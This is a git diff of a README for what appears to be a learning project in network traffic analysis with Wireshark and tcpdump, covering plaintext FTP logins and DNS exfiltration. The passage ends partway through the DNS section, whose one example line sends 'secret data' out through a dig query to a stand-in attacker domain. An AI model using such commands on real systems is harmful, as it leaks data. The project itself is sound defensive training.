@@ -1,23 +1,47 @@
-# Network-Traffic-Analysis-Wireshark-TCPDump
+# 🔍 Network Traffic Analysis with Wireshark & tcpdump
 
-This project will be for me to familiarize myself with common tools used in Cybersecurity such as Wireshark, tcpdump, VM's, and more!
+## 📘 Overview
+This project demonstrates how to use Wireshark and tcpdump on Kali Linux to capture and analyze different types of network traffic. It focuses on identifying insecure protocols and suspicious behaviors such as plaintext credentials and data exfiltration through DNS.
 
-## Goal
+The goal is to showcase practical network analysis skills relevant to cybersecurity roles such as SOC Analyst and Security Analyst.
 
-- Use Wireshark and/or tcpdump on Kali Linux to capture and analyze common tpyes of network traffic.
-- Demonstrate the ability to identify security-relevant traffic like:
-    - FtP logins sent in plaintext
-    - DNS exfiltration attempts
-    - HTTP GET/POST requests
-    - BASIC ICMP pings (optional)
-    - SSL/TLS handshake (optional, for contrast)
-------------------------------------------------------------------------------------------------------------------------
+---
 
-## Setup
+## 🛠️ Tools Used
+- Kali Linux (2024.1)
+- Wireshark
+- tcpdump
+- FTP server (vsftpd or Metasploitable)
+- Dig / Iodine for DNS testing
 
-- Tools:
-    - Kali Linux VM
-    - Wireshark and/or tcpdump
-    - Optional: Set up vulnerable test services using Metaplotable, DVWA, or Dockerized services (e.g., FTP server)
-------------------------------------------------------------------------------------------------------------------------
+---
+
+## 🧪 Traffic Analysis
+
+### 1️⃣ FTP Login in Plaintext
+
+- **Capture File:** `ftp_login.pcap`
+- **Scenario:** A user logs into an FTP server using unencrypted credentials.
+- **Findings:** The credentials were clearly visible in the packet capture.
+  
+#### 🔎 Key Observations:
+- FTP transmits credentials in plaintext.
+- Wireshark filter used: `ftp.request`
+- Captured `USER` and `PASS` commands with values.
+
+📷 **Screenshot:**  
+![FTP Login](screenshots/ftp_login.png)
+
+---
+
+### 2️⃣ DNS Exfiltration Attempt
+
+- **Capture File:** `dns_exfiltration.pcap`
+- **Scenario:** A client encodes sensitive data into DNS queries.
+- **Findings:** Suspiciously long or randomized domain names that indicate potential exfiltration.
+
+#### 🔎 Key Observations:
+- Used `dig` to simulate exfiltration:
+  ```bash
+  dig verysecretdata.attacker-domain.com
 
